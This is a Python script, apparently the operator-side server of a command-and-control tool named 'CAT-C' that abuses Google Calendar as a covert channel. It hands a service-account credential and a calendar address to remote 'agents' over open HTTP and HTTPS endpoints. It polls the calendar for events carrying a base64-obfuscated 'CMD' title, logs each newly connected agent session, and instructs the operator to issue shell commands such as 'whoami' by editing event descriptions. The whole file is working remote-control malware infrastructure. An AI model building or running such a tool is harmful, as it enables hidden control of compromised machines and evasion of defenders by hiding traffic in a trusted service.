#!/usr/bin/env python3
"""
🐱 CAT-C CONFIG SERVER + Auto Link Logger (No Web UI)
- Serves /creds and /email for the agent
- Prints direct Google Calendar event links only once per unique (event_id, session_id)
"""

import time
import base64
import json
import sys
import threading
from datetime import datetime, timezone, timedelta
from flask import Flask
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

# ---------- Colors ----------
class Colors:
    GREEN = '\033[92m'
    DARK_RED = '\033[31m'
    BRIGHT_RED = '\033[91m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ---------- Load service account ----------
try:
    with open('credits.json', 'r') as f:
        CREDS_JSON = f.read()
    print(f"{Colors.GREEN}✅ credits.json loaded{Colors.END}")
except Exception as e:
    print(f"{Colors.DARK_RED}❌ ERROR: credits.json required - {e}{Colors.END}")
    sys.exit(1)

# ---------- Configuration ----------
CALENDAR_EMAIL = "m37h693@gmail.com"          # <-- CHANGE TO YOUR CALENDAR EMAIL
COMMAND_TITLE = base64.b64encode(b"CMD").decode()[:8]   # "Q01E"
POLL_INTERVAL = 10   # seconds between checking for new command events

# ---------- Google API helpers ----------
def get_service():
    creds_info = json.loads(CREDS_JSON)
    creds = Credentials.from_service_account_info(
        creds_info,
        scopes=['https://www.googleapis.com/auth/calendar']
    )
    return build('calendar', 'v3', credentials=creds)

def get_command_events():
    """Return all command events with their IDs, session IDs, and links."""
    service = get_service()
    events = []
    try:
        page_token = None
        while True:
            resp = service.events().list(
                calendarId=CALENDAR_EMAIL,
                q=COMMAND_TITLE,
                maxResults=50,
                singleEvents=True,
                pageToken=page_token
            ).execute()
            for ev in resp.get('items', []):
                if ev.get('summary') == COMMAND_TITLE:
                    desc = ev.get('description', '')
                    parts = desc.split()
                    if len(parts) >= 2:
                        session_id = parts[1]
                        events.append({
                            'id': ev['id'],
                            'session_id': session_id,
                            'link': ev.get('htmlLink'),
                            'updated': ev.get('updated')
                        })
            page_token = resp.get('nextPageToken')
            if not page_token:
                break
    except Exception as e:
        print(f"{Colors.DARK_RED}⚠️ Error listing events: {e}{Colors.END}")
    return events

# ---------- Background link logger (no duplicates) ----------
seen_connections = set()   # stores (event_id, session_id)

def link_logger_loop():
    print(f"{Colors.BLUE}🔍 Monitoring for new agent command events...{Colors.END}")
    while True:
        try:
            events = get_command_events()
            for ev in events:
                conn_key = (ev['id'], ev['session_id'])
                if conn_key not in seen_connections:
                    seen_connections.add(conn_key)
                    print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
                    print(f"{Colors.BOLD}🐱 New agent connected!{Colors.END}")
                    print(f"   Session ID: {ev['session_id']}")
                    print(f"   Command event link: {Colors.CYAN}{ev['link']}{Colors.END}")
                    print(f"   Instructions: Open the link, edit description with 'CMD:whoami'")
                    print(f"{Colors.GREEN}{'='*60}{Colors.END}\n")
        except Exception as e:
            print(f"{Colors.DARK_RED}⚠️ Logger error: {e}{Colors.END}")
        time.sleep(POLL_INTERVAL)

# ---------- Config server (ports 8080/8443) ----------
config_app = Flask(__name__)

@config_app.route('/creds')
def creds():
    return base64.b64encode(CREDS_JSON.encode()).decode()

@config_app.route('/email')
def email():
    return CALENDAR_EMAIL

@config_app.route('/')
def status():
    return "CAT-C CONFIG SERVER ACTIVE"

def run_config_http():
    config_app.run(host='0.0.0.0', port=8080, debug=False)

def run_config_https():
    config_app.run(host='0.0.0.0', port=8443, ssl_context='adhoc', debug=False)

# ---------- Main ----------
if __name__ == '__main__':
    banner = f"""
{Colors.DARK_RED}{Colors.BOLD}
               _
            |\\/( _
            /   -`'.
            |  =__-/=
            /   (
           ;     \\\\
          /      |
         /    ,  /
       .'      | |
      /      --; |
      |         ||  __
      |        /_;-` _`'.
      \\  '-----' _.-` '._)
MEOW   `'-------"
{Colors.BRIGHT_RED}------------------------------------------------{Colors.END}
    """
    print(banner)
    print(f"{Colors.YELLOW}Target Calendar:{Colors.END}  {Colors.CYAN}{CALENDAR_EMAIL}{Colors.END}")
    print(f"{Colors.BLUE}Config HTTP:{Colors.END}  0.0.0.0:8080  (for agent /creds, /email)")
    print(f"{Colors.BLUE}Config HTTPS:{Colors.END} 0.0.0.0:8443  (self-signed)")
    print(f"{Colors.GREEN}✅ No web UI. Agent event links will appear here when they connect.{Colors.END}")
    print("-" * 50)

    # Start config servers
    threading.Thread(target=run_config_http, daemon=True).start()
    threading.Thread(target=run_config_https, daemon=True).start()

    # Start link logger in main thread
    try:
        link_logger_loop()
    except KeyboardInterrupt:
        print(f"\n{Colors.DARK_RED}CAT-C shutdown{Colors.END}")
        sys.exit(0)
